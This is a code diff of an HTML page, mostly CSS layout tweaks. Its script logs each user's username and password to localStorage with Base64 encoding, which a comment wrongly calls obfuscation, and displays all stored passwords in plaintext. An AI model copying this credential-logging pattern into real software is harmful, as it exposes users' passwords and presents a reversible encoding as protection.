@@ -86,13 +86,11 @@
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 80%; /* Adjusted width */
+            width: 500px;
             text-align: center;
             display: none;
             color: white;
             margin-top: 80px; /* To offset for the navbar */
-            margin-left: auto; /* Center horizontally */
-            margin-right: auto; /* Center horizontally */
             overflow-y: auto;
             max-height: calc(100vh - 120px);
         }
@@ -112,14 +110,10 @@
             word-wrap: break-word;
         }
         .log-item {
-            margin-bottom: 20px; /* Increased margin between log items */
+            margin-bottom: 10px;
         }
         .log-item div {
             margin-bottom: 5px;
-        }
-        .log-divider {
-            border-bottom: 2px solid #777; /* Divider style */
-            margin: 10px 0; /* Margin around the divider */
         }
         button {
             background-color: #ff0000;
@@ -187,7 +181,7 @@
             const formattedTimestamp = formatDate(new Date(timestamp));
             const newLog = { username, password: btoa(password), timestamp: formattedTimestamp }; // Obfuscate password with Base64 encoding
             logs.push(newLog);
-            localStorage.setItem('loginLogs, JSON.stringify(logs));
+            localStorage.setItem('loginLogs', JSON.stringify(logs));
         }
 
         function formatDate(date) {
@@ -215,7 +209,6 @@
                     <div>[${log.timestamp}]</div>
                     <div>Username: ${log.username}</div>
                     <div>Password: ${atob(log.password)}</div>
-                    <div class="log-divider"></div> <!-- Divider -->
                 </div>`).join('');
         }
 
@@ -243,7 +236,6 @@
                     <div>[${log.timestamp}]</div>
                     <div>Username: ${log.username}</div>
                     <div>Password: ${atob(log.password)}</div>
-                    <div class="log-divider"></div> <!-- Divider -->
                 </div>`).join('');
         }
     </script>
